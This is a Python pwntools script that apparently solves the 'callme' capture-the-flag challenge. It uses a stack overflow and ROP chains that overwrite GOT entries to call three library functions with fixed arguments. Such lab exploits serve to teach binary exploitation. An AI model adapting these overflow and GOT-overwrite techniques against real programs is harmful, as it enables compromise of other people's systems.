#!/usr/bin/env python3

from pwn import *
from time import sleep

elf = ELF("./callme")
libc = ELF("./libcallme.so")

context.binary = elf
context.terminal = ('kgx', '-e')

def main():
    r = gdb.debug(elf.path, 'b callme_one \n c')
    r.recvuntil(b'> ')
    
    #overwrite exit@got
    payload  = p64(0x4009a3)             # pop rdi; ret
    payload += p64(0x0)                  # arg1 
    payload += p64(0x40093d)             # pop rsi; pop rdx; ret
    payload += p64(elf.got['exit'])      # exit@got (buf)
    payload += p64(0x8)                  # nbytes
    payload += p64(0x400710)             # read@plt

    #call function: callme_one
    payload += p64(0x4009a3)             # pop rdi; ret
    payload += p64(0xDEADBEEFDEADBEEF)   # arg1
    payload += p64(0x40093d)             # pop rsi; pop rdx; ret
    payload += p64(0xCAFEBABECAFEBABE)   # arg2
    payload += p64(0xD00DF00DD00DF00D)   # arg3
    payload += p64(0x40092D)             # call callme_one

    r.sendline(b'a'*40 + payload)
    print('payload 1 sent')

    sleep(1)
    r.send(p64(elf.sym['pwnme'])) #overwrite exit@got with pwnme so the program doesn't exit
    print('payload 2 sent')

    r.recvuntil(b'> ')

    #overwrite callme_one@got
    payload  = p64(0x4009a3)             # pop rdi; ret
    payload += p64(0x0)                  # arg1 
    payload += p64(0x40093d)             # pop rsi; pop rdx; ret
    payload += p64(elf.got['callme_one']) # callme_one@got (buf)
    payload += p64(0x8)                  # nbytes
    payload += p64(0x400710)             # read@plt

    #call function: callme_two
    payload += p64(0x4009a3)             # pop rdi; ret
    payload += p64(0xDEADBEEFDEADBEEF)   # arg1
    payload += p64(0x40093d)             # pop rsi; pop rdx; ret
    payload += p64(0xCAFEBABECAFEBABE)   # arg2
    payload += p64(0xD00DF00DD00DF00D)   # arg3
    payload += p64(0x400919)             # call callme_two

    r.sendline(b'a'*40 + payload)
    print('payload 3 sent')
    sleep(1)
    r.send(p64(elf.sym['pwnme'])) #overwrite callme_one@got with pwnme so the program doesn't exit

    r.recvuntil(b'> ')
    
    #call function: callme_three
    payload  = p64(0x4009a3)             # pop rdi; ret
    payload += p64(0xDEADBEEFDEADBEEF)   # arg1
    payload += p64(0x40093d)             # pop rsi; pop rdx; ret
    payload += p64(0xCAFEBABECAFEBABE)   # arg2
    payload += p64(0xD00DF00DD00DF00D)   # arg3
    payload += p64(0x400905)             # call callme_three

    r.sendline(b'a'*40 + payload)
    print('payload 4 sent')

    r.interactive()


if __name__ == "__main__":
    main()
